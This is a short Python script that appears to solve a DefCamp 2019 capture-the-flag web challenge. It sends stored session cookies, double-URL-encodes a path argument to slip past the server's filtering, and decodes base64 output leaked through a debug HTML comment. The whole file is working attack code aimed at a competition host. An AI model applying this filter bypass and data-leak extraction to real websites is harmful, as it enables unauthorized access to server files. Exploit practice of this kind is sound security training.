from requests import get
from sys import argv

cookie={
"XSRF-TOKEN":"eyJpdiI6InprYnhlM1lreGplS2VwSXlxM25wRVE9PSIsInZhbHVlIjoiOHhuU2ZWZHRvQm1SNlpwc1ZJMWJGY1ZOd1lnOGlRM0dHYUpVdUozM2dmZTVSK2FzMzNSaWNsZ3hFcGJSVDVkbCIsIm1hYyI6ImI5OTM4NmVjNDVjNTc5MTJlNTEwNTFjMzNkMWUxMDRiODEzNGI5MjE1NzQxNjcxODM3MzJkYzkzMjYwZmU3MWMifQ%3D%3D",
"laravel_session":"eyJpdiI6IkNOXC9mYUlLeEZxd0Z6WkJCMkkrR0FBPT0iLCJ2YWx1ZSI6ImlJVkNvTGsyUWtSemNXQ0pDTjFLNGd5K2JUcFE2QjhqUG5TczFDdkI2NE9GVGFlN0g1ZXZIN09QSitQWXMrYloiLCJtYWMiOiI2M2Q1MmUwZDJhOTZiZmE1Y2NjZTlhYjM3NjYxMWFmZGM5NjI5NzA1ZWQwYzQ0YWY1NDBmYmJlMTk1ZTYyYTUxIn0%3D"
        }
url = "https://online-album.dctfq19.def.camp/album/{}".format(argv[1].replace('/', '%2F').replace('%', '%25'))
headers={
        "User-Agent":"PostmanRuntime/7.16.3"
        }

data = get(url, cookies=cookie,headers=headers)
data = data.text
k=data.find('Debug:')
data = data[k+len('Debug:')+1:]
l=data.find('-->')
data=data[:l]

from base64 import b64decode
s=data
s=s.strip()

i = s.find('.')
while i != -1:
    k = s[0:i]
    s = s[i+1:]
    n = s.find('\n')
    s = s[n+1:]
    i=s.find('.')
    k=k.strip()
    print (b64decode(k))
